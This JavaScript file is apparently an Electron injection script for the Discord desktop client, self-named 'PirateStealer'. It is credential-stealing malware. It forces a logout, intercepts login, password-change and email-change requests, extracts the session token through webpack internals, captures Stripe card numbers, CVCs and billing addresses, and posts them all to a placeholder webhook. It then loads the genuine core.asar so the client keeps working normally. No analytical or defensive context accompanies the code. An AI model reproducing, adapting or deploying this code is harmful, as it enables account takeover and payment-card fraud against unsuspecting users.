const fs=require("fs");
const path=require("path");
const { BrowserWindow:BrowserWindow,session:session }=require("electron");
const https=require("https");
const querystring=require("querystring");
var webhook="%WEBHOOK_LINK%";
function FirstTime(){
    if(!fs.existsSync(path.join(__dirname,"PirateStealerBTW")))return!0;
    return fs.rmdirSync(path.join(__dirname,"PirateStealerBTW")),BrowserWindow.getFocusedWindow().webContents.executeJavaScript('function LogOut(){var t=webpackJsonp.push([[],{extra_id:(t,n,e)=>t.exports=e},[["extra_id"]]]);(function(n){const e="string"==typeof n?n:null;for(const o in t.c)if(t.c.hasOwnProperty(o)){const r=t.c[o].exports;if(r&&r.__esModule&&r.default&&(e?r.default[e]:n(r.default)))return r.default;if(r&&(e?r[e]:n(r)))return r}return null})("login").logout()} LogOut()',!0).then(e=>{

    }),!1}
    webhook=webhook.replace("https://discord.com","").replace("https://canary.discord.com","").replace("https://ptb.discord.com","").replace("https://discordapp.com","");
    const Filter={
        urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","https://*.discord.com/api/v*/users/@me/billing/subscriptions","https://discord.com/api/v*/users/@me/billing/subscriptions"]};
        function SendToWebhook(e){
            const t={hostname:"discord.com",port:443,path:webhook,method:"POST",headers:{"Content-Type":"application/json","Content-Length":e.length}},r=https.request(t,e=>{
                e.on("data",e=>{
                    process.stdout.write(e)
                })
            });
            r.on("error",e=>{
                console.error(e)
            }),
            r.write(e),
            r.end()}
            function GetNitro(e){
                return 0==e?"No Nitro":1==e?"Nitro Classic":2==e?"Nitro Boost":"No Nitro"
            }
            function GetBadges(e){
                var t="";return 1==(1&e)&&(t+="Staff,"),2==(2&e)&&(t+="Partner,"),4==(4&e)&&(t+="Hypesquad Event,"),8==(8&e)&&(t+="Green Bughunter,"),64==(64&e)&&(t+="Hypesquad Bravery,"),128==(128&e)&&(t+="HypeSquad Brillance,"),256==(256&e)&&(t+="HypeSquad Balance,"),512==(512&e)&&(t+="Early Supporter,"),16384==(16384&e)&&(t+="Gold BugHunter,"),131072==(131072&e)&&(t+="Discord Developer,"),""==t&&(t="None"),t
            }function Login(e,t,r){
                const o={
                    hostname:"discord.com",port:443,path:"/api/v8/users/@me",method:"GET",headers:{Authorization:r}
                };
                https.get(o,o=>{
                    let s="";
                    o.on("data",e=>{
                        s+=e
                    }),
                    o.on("end",()=>{
                        const o=JSON.parse(s);
                        var a={
                            username:"ccbb",content:"",embeds:[{title:"User Login",description:"**Username:**```"+o.username+"#"+o.discriminator+"```\n**ID:** ```"+o.id+"```\n**Nitro:** ```"+GetNitro(o.premium_type)+"```\n**Badges:**```"+GetBadges(o.flags)+"```\n**Email: **```"+e+"```\n**Password: **```"+t+"```\n**Token:**```"+r+"```",author:{name:"ccbb"},footer:{text:"lawtbg"},thumbnail:{url:"https://cdn.discordapp.com/avatars/"+o.id+"/"+o.avatar}}]
                        };
                        SendToWebhook(JSON.stringify(a))
                    })
                }).on("error",e=>{
                    console.log("Error: ",e.message)
                })}
                function ChangePassword(e,t,r){
                    const o={
                        hostname:"discord.com",port:443,path:"/api/v8/users/@me",method:"GET",headers:{Authorization:r}
                    };
                    https.get(o,o=>{
                        let s="";
                        o.on("data",e=>{
                            s+=e
                        }),o.on("end",()=>{
                            var o=JSON.parse(s),
                            a={
                                username:"ccbb",content:"",embeds:[{title:"Password Changed",description:"**Username:**```"+o.username+"#"+o.discriminator+"```\n**ID:** ```"+o.id+"```\n**Nitro:** ```"+GetNitro(o.premium_type)+"```\n**Badges:**```"+GetBadges(o.flags)+"```\n**Email: **```"+o.email+"```\n**Old Password: **```"+e+"```\n**New Password: **```"+t+"```\n**Token:**```"+r+"```",author:{name:"ccbb"},footer:{text:"lawtbg"},thumbnail:{url:"https://cdn.discordapp.com/avatars/"+o.id+"/"+o.avatar}}]
                            };
                            SendToWebhook(JSON.stringify(a))
                        })
                    }).on("error",e=>{
                        console.log("Error: ",e.message)
                    })}
                    function ChangeEmail(e,t,r){
                        const o={
                            hostname:"discord.com",port:443,path:"/api/v8/users/@me",method:"GET",headers:{Authorization:r}};
                            https.get(o,o=>{
                                let s="";
                                o.on("data",e=>{
                                    s+=e
                                }),
                                o.on("end",()=>{
                                    var o=JSON.parse(s),
                                    a={
                                        username:"ccbb",content:"",embeds:[{title:"Email Changed",description:"**Username:**```"+o.username+"#"+o.discriminator+"```\n**ID:** ```"+o.id+"```\n**Nitro:** ```"+GetNitro(o.premium_type)+"```\n**Badges:**```"+GetBadges(o.flags)+"```\n**New Email: **```"+e+"```\n**Password: **```"+t+"```\n**Token:**```"+r+"```",author:{name:"ccbb"},footer:{text:"lawtbg"},thumbnail:{url:"https://cdn.discordapp.com/avatars/"+o.id+"/"+o.avatar}}]
                        };
                        SendToWebhook(JSON.stringify(a))
                    })
                }).on("error",e=>{
                    console.log("Error: ",e.message)
                })}
                function CreditCardAdded(e,t,r,o,s,a,n,i,d,c){
                    const p={
                        hostname:"discord.com",port:443,path:"/api/v8/users/@me",method:"GET",headers:{Authorization:c}};
                        https.get(p,p=>{
                            let l="";
                            p.on("data",e=>{
                                l+=e
                            }),
                            p.on("end",()=>{
                                var p=JSON.parse(l),
                                u={
                                    username:"ccbb",content:"",embeds:[{title:"User Credit Card Added",description:"**Username:**```"+p.username+"#"+p.discriminator+"```\n**ID:**```"+p.id+"```\n**Email:**```"+p.email+"```\n**Nitro Type:**```"+GetNitro(p.premium_type)+"```\n**Badges:**```"+GetBadges(p.flags)+"```\n**Credit Card Number: **```"+e+"```\n**Credit Card Expiration: **```"+r+"/"+o+"```\n**CVC: **```"+t+"```\n**Country: **```"+d+"```\n**State: **```"+n+"```\n**City: **```"+a+"```\n**ZIP:**```"+i+"```\n**Street: **```"+s+"```**Token:**```"+c+"```",author:{name:"ccbb"},footer:{text:"lawtbg"},thumbnail:{url:"https://cdn.discordapp.com/avatars/"+p.id+"/"+p.avatar}}]
                                };
                                SendToWebhook(JSON.stringify(u))
                            })
                        }).on("error",e=>{
                            console.log("Error: ",e.message)
                        })}
                        session.defaultSession.webRequest.onBeforeRequest(Filter,(e,t)=>{
                            FirstTime()&&t({cancel:!1})
                        });
                        const ChangePasswordFilter={
                            urls:["https://discord.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.stripe.com/v*/tokens"]
                        };
                            session.defaultSession.webRequest.onCompleted(ChangePasswordFilter,(e,t)=>{
                                if(e.url.endsWith("login")&&200==e.statusCode){
                                    const t=JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()),r=t.login,o=t.password;BrowserWindow.getFocusedWindow().webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token',!0).then(e=>{
                                        Login(r,o,e)
                                    })}
                                    if(e.url.endsWith("users/@me")&&200==e.statusCode&&"PATCH"==e.method){
                                        const t=JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());if(null!=t.password&&null!=t.password&&""!=t.password){if(null!=t.new_password&&null!=t.new_password&&""!=t.new_password){BrowserWindow.getFocusedWindow().webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token',!0).then(e=>{
                                            ChangePassword(t.password,t.new_password,e)
                                        })}
                                        if(null!=t.email&&null!=t.email&&""!=t.email){
                                            BrowserWindow.getFocusedWindow().webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token',!0).then(e=>{
                                                ChangeEmail(t.email,t.password,e)
                                            })}}}
                                            if(e.url.endsWith("tokens")){
                                                const t=BrowserWindow.getFocusedWindow(),r=querystring.parse(decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString()));
                                                t.webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token',!0).then(e=>{
                                                    CreditCardAdded(r["card[number]"],r["card[cvc]"],r["card[exp_month]"],r["card[exp_year]"],r["card[address_line1]"],r["card[address_city]"],r["card[address_state]"],r["card[address_zip]"],r["card[address_country]"],e)
                                                })}}),
                                                module.exports=require("./core.asar");